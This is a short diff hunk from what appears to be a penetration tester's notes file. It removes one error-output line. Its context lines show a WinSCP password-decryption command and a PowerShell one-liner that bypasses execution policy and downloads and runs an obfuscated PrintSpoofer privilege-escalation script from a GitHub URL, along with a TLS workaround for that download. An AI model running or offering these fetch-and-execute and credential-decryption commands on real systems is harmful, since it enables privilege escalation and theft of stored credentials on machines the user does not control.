@@ -68,7 +68,6 @@ apt-kali :: ~ » python3 WinSCPDec.py --host=127.0.0.1 --user=root --pass=A35C74
 Obfuscated PrintSpoofer script.
 ```powershell
 > powershell -nop -ExecutionPolicy Bypass -c "IEX(New-Object Net.WebClient).downloadString('https://raw.githubusercontent.com/0xPThree/Windows-Harvesting/refs/heads/main/obf_ps.ps1')"
-[-] Please specify a command to execute
 
 ## If error: "The request was aborted: Could not create SSL/TLS secure channel."
 > [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 
